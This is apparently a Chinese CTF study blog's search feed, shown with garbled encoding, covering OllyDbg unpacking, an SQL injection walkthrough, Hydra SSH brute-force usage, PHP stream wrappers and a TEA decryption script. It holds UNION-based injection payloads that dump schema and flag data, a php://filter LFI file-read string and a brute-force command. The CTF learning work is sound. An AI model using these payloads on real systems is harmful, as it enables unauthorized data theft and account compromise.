lazyload><br>è¿”å›åˆ°ç”¨æˆ·ä»£ç alt+f9<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122017851.png" srcset="/img/loading.gif" lazyload><br>ç„¶åå•æ­¥è·Ÿè¸ªåˆ°è¾¾oep</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122017705.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>5<br>bp 0045DE74<br>è¿è¡Œ,åˆ°è¾¾åå–æ¶ˆæ–­ç‚¹<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018701.png" srcset="/img/loading.gif" lazyload><br>åœ¨retnå¤„ä¼šè¿”å›å¹¶æ‰§è¡Œç¨‹åºæˆ‘ä»¬ç°åœ¨ä¸‹é¢ä¸‹ä¸ªæ–­ç‚¹ï¼Œç„¶åå•æ­¥åˆ°OEP<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018935.png" srcset="/img/loading.gif" lazyload><br>è¿™ä¸€æ®µæ±‡ç¼–æ¯”è¾ƒé‡è¦æ³¨æ„åœ¨retnåé¢åŠ ä¸Šæ–­ç‚¹</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122018816.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>6<br>bp VirtualAlloc<br>shift+f9,å–æ¶ˆæ–­ç‚¹,è¿”å›ç”¨æˆ·ä»£ç alt+f9<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018918.png" srcset="/img/loading.gif" lazyload><br>æŸ¥æ‰¾jump<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018029.png" srcset="/img/loading.gif" lazyload><br>å•æ­¥åˆ°OEP</p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122018091.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>7  å–æ¶ˆå¼‚å¸¸<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018128.png" srcset="/img/loading.gif" lazyload><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018041.png" srcset="/img/loading.gif" lazyload><br>åˆ©ç”¨shift+f9,ä¸¤æ¬¡è¿‡åå‘ç°è·‘é£ï¼Œåˆ©ç”¨ç¬¬äºŒæ¬¡çš„SEå¥æŸ„åœ°å€ï¼Œï¼ˆå¦‚æœå‘ç°å•è¯å°±è·‘é£äº†é‚£æ˜¯åº”ä¸ºå¾çˆ±ç ´è§£odä¸­çš„æ’ä»¶strongodçš„è¿‡åœ¨optionä¸­å°†skip some Exceptionå–æ¶ˆå°±è¡Œï¼‰<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122019809.png" srcset="/img/loading.gif" lazyload><br>æŸ¥æ‰¾å¥æŸ„<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122018041.png" srcset="/img/loading.gif" lazyload><br><img src="http://gitee.com/fogpost/photo/raw/master/202409122019805.png" srcset="/img/loading.gif" lazyload></p></blockquote><p><img src="http://gitee.com/fogpost/photo/raw/master/202409122019946.png" srcset="/img/loading.gif" lazyload></p><blockquote><p>8  ä¸¤æ¬¡å†…å­˜<br>æ³¨æ„å¯¹æ¯”è·³è·ƒä»£ç <br>9  at Getversion<br>åˆ°è¾¾OEPçš„ä¸‹æ–¹</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è„±å£³</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Sqlæ³¨å…¥åˆè¯†</title>
    <link href="/2024/09/12/sql%E5%88%9D%E8%AF%95/"/>
    <url>/2024/09/12/sql%E5%88%9D%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="Sqlæ³¨å…¥åˆè¯†"><a href="#Sqlæ³¨å…¥åˆè¯†" class="headerlink" title="Sqlæ³¨å…¥åˆè¯†"></a>Sqlæ³¨å…¥åˆè¯†</h1><p>&nbsp;&nbsp;æˆ‘ä»¬é¦–å…ˆäº†è§£sqlæ³¨å…¥å°±æ˜¯åœ¨sqlæ•°æ®åº“è¯­å¥æ‰§è¡Œçš„æ—¶å€™è·³è¿‡æ­£ç¡®çš„æ‰§è¡Œæ¥è¿›è¡Œæˆ‘ä»¬çš„è¯­å¥è¾¾åˆ°æƒé™è·³è¿‡ç›´æ¥è¿›è¡Œå‘½ä»¤çš„æ‰§è¡Œ<br><img src="http://gitee.com/fogpost/photo/raw/master/429e120f5162b5a822cd10cba585135c.png" srcset="/img/loading.gif" lazyload><br>ä»¥nssctfé¢˜ä¸ºä¾‹<br>é¦–å…ˆåœ¨äº†è§£äº†å¯ä»¥åˆ©ç”¨ä¸‡èƒ½å¯†ç 1â€™è¿›è¡Œå›æ˜¾ä¹‹åæˆ‘ä»¬åˆ©ç”¨sqlè¯­å¥è¿›è¡Œåº“çš„æŸ¥çœ‹</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 3 --+ </span><br><span class="hljs-string">?wllm=1&#x27;</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>ç¡®å®šå‡ åˆ—ä¹‹åä¾¿å¯ä»¥ç”¨è¯­å¥æŸ¥è¯¢</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200500.png" srcset="/img/loading.gif" lazyload><br>ä¾¿å¯ä»¥äº†è§£ç¬¬äºŒåˆ—å’Œç¬¬ä¸‰åˆ—çš„ç±»å‹<br>ç„¶åè¾“å…¥ä¸€ä¸‹è¯­å¥ï¼ŒæŸ¥è¯¢æ•°æ®åº“åç§°ï¼Œä»¥åŠåº“ä¸­æœ‰ä»€ä¹ˆè¡¨ï¼Œ<br>å¹¶æŸ¥è¯¢ä¸¤å¼ è¡¨ä¸­çš„å­—æ®µï¼Œå‘ç°flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,database() --+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(table_name) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;test_db&#x27;</span><span class="hljs-comment">--+</span><br><br>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?wllm=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(column_name) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200638.png" srcset="/img/loading.gif" lazyload><br><img src="http://gitee.com/fogpost/photo/raw/master/20240912200811.png" srcset="/img/loading.gif" lazyload><br>æœ€åä»è¡¨ä¸­æŸ¥è¯¢flag</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,flag from test_tb --+</span><br></code></pre></td></tr></table></figure><p><img src="http://gitee.com/fogpost/photo/raw/master/20240912200912.png" srcset="/img/loading.gif" lazyload></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Sql</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å·¥å…·ä½¿ç”¨è¯´æ˜ä¹¦</title>
    <link href="/2024/09/12/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/"/>
    <url>/2024/09/12/%E4%B8%80%E4%BA%9B%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="å·¥å…·ä½¿ç”¨è¯´æ˜ä¹¦"><a href="#å·¥å…·ä½¿ç”¨è¯´æ˜ä¹¦" class="headerlink" title="å·¥å…·ä½¿ç”¨è¯´æ˜ä¹¦"></a>å·¥å…·ä½¿ç”¨è¯´æ˜ä¹¦</h1><h3 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h3><p>hydra -l root -p root 127.0.0.1 -s 2111 ssh -f<br>-lï¼š LOGIN      æŒ‡å®šç ´è§£çš„ç”¨æˆ·ï¼Œå¯¹ç‰¹å®šç”¨æˆ·ç ´è§£ã€‚<br>-Lï¼šFILE     æŒ‡å®šç”¨æˆ·åå­—å…¸ã€‚<br>-pï¼šPASS ï¼ŒæŒ‡å®šå¯†ç ç ´è§£ï¼Œå°‘ç”¨ï¼Œä¸€èˆ¬æ˜¯é‡‡ç”¨å¯†ç å­—å…¸ã€‚<br>-Pï¼š FILE   æŒ‡å®šå¯†ç å­—å…¸æ–‡ä»¶<br>-sï¼š PORT æŒ‡å®šçˆ†ç ´ç«¯å£<br>-Mï¼šFILE    æŒ‡å®šç›®æ ‡åˆ—è¡¨æ–‡ä»¶<br>-Cï¼š FILE   ä½¿ç”¨å†’å·åˆ†å‰²æ ¼å¼ï¼Œä¾‹å¦‚â€œç™»å½•å : å¯†ç â€æ¥ä»£æ›¿-L&#x2F;-På‚æ•°ã€‚<br>-fï¼š  åœ¨ä½¿ç”¨-Må‚æ•°ä»¥åï¼Œæ‰¾åˆ°ç¬¬ä¸€å¯¹ç™»å½•åæˆ–è€…å¯†ç çš„æ—¶å€™ä¸­æ­¢ç ´è§£</p><blockquote><p>ps:æˆ‘ä»¬å¯ä»¥åˆ©ç”¨hydra -hæ¥æŸ¥çœ‹å¸®åŠ©</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tool</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>è„šæœ¬å‘½ä»¤å’Œæ™®é€šå‘½ä»¤çš„åŒºåˆ«</title>
    <link href="/2024/09/12/%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4%E7%9A%84%E6%94%B9%E5%8F%98/"/>
    <url>/2024/09/12/%E8%84%9A%E6%9C%AC%E5%91%BD%E4%BB%A4%E7%9A%84%E6%94%B9%E5%8F%98/</url>
    
    <content type="html"><![CDATA[<h3 id="è„šæœ¬å‘½ä»¤å’Œæ™®é€šå‘½ä»¤çš„åŒºåˆ«"><a href="#è„šæœ¬å‘½ä»¤å’Œæ™®é€šå‘½ä»¤çš„åŒºåˆ«" class="headerlink" title="è„šæœ¬å‘½ä»¤å’Œæ™®é€šå‘½ä»¤çš„åŒºåˆ«"></a>è„šæœ¬å‘½ä»¤å’Œæ™®é€šå‘½ä»¤çš„åŒºåˆ«</h3><blockquote><p>åœ¨æˆ‘ä»¬å°†windowsç³»ç»Ÿè°ƒæˆå¯ä»¥æ‰§è¡Œè„šæœ¬å‘½ä»¤ä¹‹åæˆ‘ä»¬çš„è®¸å¤šå‘½ä»¤åœ¨cmdæˆ–iseä¸­å¯èƒ½æ— æ³•æ‰§è¡Œè¿™å¯èƒ½æ˜¯å› ä¸ºå‘½åçš„åŸå›    </p></blockquote><p>å¼€å¯è„šæœ¬æ‰§è¡Œä¹‹å‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">C:\Users\agesh&gt; where calc<br>C:\Windows\System32\calc.exe<br></code></pre></td></tr></table></figure><p>å¼€å¯ä¹‹å</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\data\code&gt; where calc<br>PS C:\data\code&gt;<br></code></pre></td></tr></table></figure><p>è§£å†³åŠæ³•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\Users\Bill&gt; where.exe calc<br>C:\Windows\System32\calc.exe<br></code></pre></td></tr></table></figure><h4 id="è§£é‡Š"><a href="#è§£é‡Š" class="headerlink" title="è§£é‡Š"></a>è§£é‡Š</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">PS C:\Users\Bill&gt; where  [cc lang=&quot;powershell&quot;]<br>cmdlet Where-Object at command pipeline position 1<br>Supply values for the following parameters:<br>Property:<br></code></pre></td></tr></table></figure><blockquote><p>æ‰€ä»¥åœ¨å†™å…¥where calcæ—¶æ‰§è¡Œçš„å…¶å®æ˜¯where-object caclè¿™æ˜¯æ²¡æœ‰è¿”å›å€¼çš„ï¼Œä¸æ˜¯æ‰§è¡Œwhere.exe calc<br>ä½†æ˜¯åœ¨éè„šæœ¬åæ¨¡å¼ä¸‹ä¸ä¼šè¯†åˆ«ä½where-objectäºæ˜¯å¯ä»¥æ­£å¸¸æ‰§è¡Œ</p></blockquote><p><a href="https://www.codenong.com/16775686/">ç›¸å…³é“¾æ¥</a></p>]]></content>
    
    
    <categories>
      
      <category>tool</category>
      
    </categories>
    
    
    <tags>
      
      <tag>script</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phpä¼ªåè®®</title>
    <link href="/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/"/>
    <url>/2024/09/11/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/</url>
    
    <content type="html"><![CDATA[<p>#phpä¼ªåè®®<br>phpä¼ªåè®®<br>å¸¸è§çš„phpä¼ªåè®®</p><p>1ï¼‰file:&#x2F;&#x2F; è®¿é—®æœ¬åœ°æ–‡ä»¶ç³»ç»Ÿ</p><p>2ï¼‰http:&#x2F;&#x2F; è®¿é—®HTTP(S)ç½‘å€</p><p>3ï¼‰ftp:&#x2F;&#x2F; è®¿é—®FTP(S)URL</p><p>4)php:&#x2F;&#x2F; è®¿é—®å„ä¸ªè¾“å‡ºè¾“å…¥æµ</p><p>5)zlib:&#x2F;&#x2F; å¤„ç†å‹ç¼©æµ</p><p>6)data:&#x2F;&#x2F; è¯»å–æ•°æ®</p><p>7)glob:&#x2F;&#x2F; æŸ¥æ‰¾åŒ¹é…çš„æ–‡ä»¶è·¯å¾„æ¨¡å¼</p><p>8)phar:&#x2F;&#x2F; PHPå½’æ¡£</p><p>9)rar:&#x2F;&#x2F; RARæ•°æ®å‹ç¼©</p><p>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php æ˜¯ä¸€ç§åˆ©ç”¨ PHP æµå°è£…å™¨ (php:&#x2F;&#x2F;filter) çš„æ–¹å¼ï¼Œå¸¸ç”¨äºæ¼æ´åˆ©ç”¨ä¸­ï¼Œç‰¹åˆ«æ˜¯åœ¨æ–‡ä»¶åŒ…å«æˆ–æ–‡ä»¶è¯»å–çš„æ”»å‡»åœºæ™¯ä¸­ã€‚è®©æˆ‘ä»¬é€æ­¥åˆ†æå…¶å«ä¹‰ï¼š</p><p>åˆ†è§£è¯´æ˜ï¼š<br>php:&#x2F;&#x2F;filterï¼š</p><p>php:&#x2F;&#x2F; æ˜¯ PHP çš„ä¸€ç§æµå°è£…åè®®ï¼Œå®ƒå…è®¸ç›´æ¥è¯»å–æˆ–å†™å…¥è¾“å…¥ã€è¾“å‡ºã€é”™è¯¯æµä»¥åŠå…¶ä»–ç‰¹æ®Šèµ„æºã€‚<br>filter æ˜¯ä¸€ç§æµè¿‡æ»¤å™¨ï¼Œå…è®¸å¯¹æµè¿›è¡Œç‰¹å®šçš„æ“ä½œï¼Œå¦‚ç¼–ç ã€è§£ç ã€å‹ç¼©ã€åŠ å¯†ç­‰ã€‚<br>convert.base64-encodeï¼š</p><p>è¿™æ˜¯æµè¿‡æ»¤å™¨çš„ä¸€ä¸ªè½¬æ¢æ“ä½œï¼Œå®ƒä¼šå°†æ–‡ä»¶å†…å®¹è¿›è¡Œ Base64 ç¼–ç ã€‚Base64 æ˜¯ä¸€ç§å°†äºŒè¿›åˆ¶æ•°æ®è½¬æ¢ä¸º ASCII å­—ç¬¦çš„ç¼–ç æ–¹å¼ï¼Œå¸¸ç”¨äºç½‘ç»œä¼ è¾“ã€‚<br>convert.base64-encode æŒ‡å®šè¦å¯¹ç›®æ ‡æ–‡ä»¶å†…å®¹è¿›è¡Œ Base64 ç¼–ç ã€‚<br>resource&#x3D;flag.phpï¼š</p><p>resource æŒ‡å®šäº†ä½ è¦æ“ä½œçš„æ–‡ä»¶èµ„æºã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œflag.php æ˜¯ç›®æ ‡æ–‡ä»¶ï¼Œé€šå¸¸æ˜¯ä¸€ä¸ªåŒ…å«æ•æ„Ÿä¿¡æ¯æˆ–æ ‡å¿—çš„æ–‡ä»¶ï¼Œå¯èƒ½ä¸å…è®¸ç›´æ¥é€šè¿‡æµè§ˆå™¨è®¿é—®ã€‚<br>é€šè¿‡æµå°è£…å™¨ï¼ŒPHP ä¼šè¯»å– flag.php çš„å†…å®¹ï¼Œå¹¶åœ¨æµæ“ä½œä¸­å°†å…¶è¿›è¡Œ Base64 ç¼–ç ã€‚<br>æ•´ä½“åŠŸèƒ½ï¼š<br>php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php çš„ä½œç”¨æ˜¯ï¼š</p><p>è¯»å– flag.php æ–‡ä»¶çš„å†…å®¹ã€‚<br>ä½¿ç”¨ Base64 ç¼–ç å¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œç¼–ç ã€‚<br>è¿”å›ç¼–ç åçš„æ–‡ä»¶å†…å®¹ï¼Œè€Œä¸æ˜¯ç›´æ¥è¿”å›åŸå§‹å†…å®¹ã€‚<br>å…¸å‹çš„åˆ©ç”¨åœºæ™¯ï¼š<br>è¿™é€šå¸¸ç”¨äº æœ¬åœ°æ–‡ä»¶åŒ…å«ï¼ˆLFIï¼‰æ¼æ´ã€‚åœ¨å­˜åœ¨ LFI æ¼æ´çš„ç³»ç»Ÿä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ PHP çš„ includeã€requireã€file_get_contents ç­‰å‡½æ•°è¯»å–ä»»æ„æ–‡ä»¶ï¼Œä½†æœ‰æ—¶æ–‡ä»¶åŒ…å«è¢«é™åˆ¶æˆ–æ•æ„Ÿæ–‡ä»¶çš„å†…å®¹ä¸å¯è§ã€‚</p><p>é€šè¿‡ php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.phpï¼Œæ”»å‡»è€…å¯ä»¥ç»•è¿‡æŸäº›é™åˆ¶ï¼Œè¯»å–æ–‡ä»¶å¹¶è·å–å…¶ Base64 ç¼–ç å†…å®¹ã€‚ç„¶åï¼Œæ”»å‡»è€…å¯ä»¥æ‰‹åŠ¨å°† Base64 å†…å®¹è§£ç ï¼ŒæŸ¥çœ‹æ–‡ä»¶çš„åŸå§‹å†…å®¹ã€‚</p><h1 id="include-once-file"><a href="#include-once-file" class="headerlink" title="include_once($file)"></a>include_once($file)</h1><h3 id="è¿”å›å€¼"><a href="#è¿”å›å€¼" class="headerlink" title="è¿”å›å€¼"></a>è¿”å›å€¼</h3><ul><li>å¦‚æœæ–‡ä»¶æˆåŠŸåŒ…å«ï¼Œinclude_once å°†ä¼šè¿”å› 1</li><li>å¦‚æœæ–‡ä»¶æ²¡æœ‰è¢«æ‰¾åˆ°æˆ–è€…åœ¨å°è¯•åŒ…å«æ–‡ä»¶è¿‡ç¨‹ä¸­æœ‰é”™è¯¯ï¼Œinclude_once ä¸ä¼šè¿”å›ä»»ä½•å€¼ï¼Œä½†ä¼šäº§ç”Ÿä¸€ä¸ªè­¦å‘Šï¼ˆé™¤é error_reporting è¢«è®¾ç½®æˆå¿½ç•¥è­¦å‘Šï¼‰ã€‚</li></ul><h3 id="å„ç±»æ–‡ä»¶ç±»å‹çš„è¾“å‡ºæƒ…å†µ"><a href="#å„ç±»æ–‡ä»¶ç±»å‹çš„è¾“å‡ºæƒ…å†µ" class="headerlink" title="å„ç±»æ–‡ä»¶ç±»å‹çš„è¾“å‡ºæƒ…å†µ"></a>å„ç±»æ–‡ä»¶ç±»å‹çš„è¾“å‡ºæƒ…å†µ</h3><p>include_once çš„å‚æ•°ä¸æ˜¯ä¸€ä¸ª PHP æ–‡ä»¶ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶çš„å†…å®¹ä¼šè¢«ç›´æ¥è¾“å‡ºï¼ˆæˆ–æ‰§è¡Œï¼Œå¦‚æœæœ‰å¯æ‰§è¡Œçš„ PHP ä»£ç ï¼‰åˆ°è¾“å‡ºæµä¸­ã€‚å…·ä½“çš„è¡Œä¸ºå–å†³äºè¯¥æ–‡ä»¶çš„å†…å®¹å’Œç±»å‹ã€‚  </p><ol><li><strong>çº¯æ–‡æœ¬æ–‡ä»¶ï¼ˆæ¯”å¦‚ .txtï¼‰</strong>: æ–‡ä»¶çš„å†…å®¹ä¼šè¢«ç›´æ¥è¾“å‡ºã€‚</li><li><strong>HTML æ–‡ä»¶ï¼ˆæ¯”å¦‚ .html æˆ– .htmï¼‰</strong>: HTML ä»£ç ä¼šè¢«ç›´æ¥è¾“å‡ºï¼Œæµè§ˆå™¨ä¼šæŒ‰ç…§ HTML æ¥æ¸²æŸ“ã€‚</li><li><strong>XML æ–‡ä»¶æˆ–å…¶ä»–æ ‡è®°è¯­è¨€æ–‡ä»¶</strong>: æ–‡ä»¶çš„å†…å®¹ä¼šè¢«ç›´æ¥è¾“å‡ºã€‚</li><li><strong>äºŒè¿›åˆ¶æ–‡ä»¶ï¼ˆæ¯”å¦‚å›¾ç‰‡æˆ–è€…éŸ³é¢‘æ–‡ä»¶ï¼‰</strong>: è¿™æ ·åšé€šå¸¸ä¸æ˜¯ä¸ªå¥½ä¸»æ„ï¼Œå› ä¸ºäºŒè¿›åˆ¶æ•°æ®å¯èƒ½ä¼šè¢«é”™è¯¯åœ°è§£é‡Šä¸ºæ–‡æœ¬ï¼Œå¯¼è‡´è¾“å‡ºä¹±ç æˆ–äº§ç”Ÿä¸å¯é¢„æµ‹çš„ç»“æœã€‚</li><li><strong>åŒ…å« PHP ä»£ç çš„é PHP æ–‡ä»¶</strong>: å¦‚æœæ–‡ä»¶ä¸­æ··åˆæœ‰ PHP ä»£ç ï¼ˆå³ä½¿æ–‡ä»¶æ‰©å±•åä¸æ˜¯ .phpï¼‰ï¼Œé‚£ä¹ˆé‚£éƒ¨åˆ† PHP ä»£ç ä»ç„¶ä¼šè¢«æ‰§è¡Œã€‚</li></ol>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>tea.dm</title>
    <link href="/2024/09/10/tea/"/>
    <url>/2024/09/10/tea/</url>
    
    <content type="html"><![CDATA[<h1 id="tea"><a href="#tea" class="headerlink" title="tea"></a>tea</h1><p>ç»ˆäºè‡ªå·±åšå‡ºä¸€é“teaäº†ä¹<br>çœ‹åŸé¢˜<br><img src="http://gitee.com/fogpost/photo/raw/master/202409122053979.png" srcset="/img/loading.gif" lazyload><br>&emsp;å…¸å‹çš„teaç›´æ¥å¥—æ¨¡æ¿ï¼Œä½†æ˜¯æœ‰é—®é¢˜ï¼Œå°±æ˜¯pyä¸­ä¸ä¼šé™å®šä¸º32ä½æ‰€ä»¥æœ€åçš„ç­”æ¡ˆä¼šè¶…çº§å¤§ï¼Œæˆ‘ä»¬å°±è¦å»è¿›è¡Œä¸€ä¸ª&amp;ffffffffçš„æ“ä½œä½¿æ•°å€¼æ­£ç¡®<br>&emsp;ç„¶åå°±æ˜¯å…³äºé¢˜ç›®ä¸­çš„å°é—®é¢˜ï¼Œé¦–å…ˆå°±æ˜¯deltaï¼Œæ ‡å‡†çš„teaæ˜¯0x9E3779B9ï¼Œä½†æ˜¯åœ¨idaä¸­æ€»æ˜¯ä¼šå‡ºç°å˜æˆ-0x61c88647çš„é—®é¢˜éœ€è¦æ³¨æ„ï¼Œç„¶åå°±æ˜¯æœ€åçš„v5æ€ä¹ˆæ±‚,å°±æ˜¯ä¸€ä¸ªåç§»ç›¸åŠ ï¼Œåœ¨expä¸­æœ‰äº†</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">v0, v1</span>):<br>    delta = <span class="hljs-number">0x9E3779B9</span><br>    v3 = delta * <span class="hljs-number">32</span><br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        v1 = (v1 - ((v0 + v3) ^ (<span class="hljs-number">16</span> * v0 + <span class="hljs-number">1634038898</span>) ^ ((v0 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1634038904</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v0 = (v0 - ((v1 + v3) ^ (<span class="hljs-number">16</span> * v1 + <span class="hljs-number">1702060386</span>) ^ ((v1 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1870148662</span>))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>        v3 = (v3 - delta) &amp; <span class="hljs-number">0xFFFFFFFF</span><br>    <span class="hljs-keyword">return</span> v0, v1<br><span class="hljs-comment">#å·²çŸ¥çš„åŠ å¯†ç»“æœ</span><br>v4 = <span class="hljs-number">676078132</span><br>v5 = <span class="hljs-number">957400408</span><br><span class="hljs-comment">#è§£å¯†</span><br>v10, v11 = decrypt(v4, v5)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Decrypted v10: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v10)&#125;</span>, v11: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(v11)&#125;</span>&quot;</span>)<br>i=<span class="hljs-number">0x49BD</span><br>j=<span class="hljs-number">0x8e00</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(i)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">hex</span>(j)+<span class="hljs-string">&quot; &quot;</span>+<span class="hljs-built_in">hex</span>(i|(j&lt;&lt;<span class="hljs-number">16</span>)))<br><span class="hljs-comment">#moectf&#123;836153a5-8e00-49bd-9c42-caf30620caaf&#125;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>decode</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
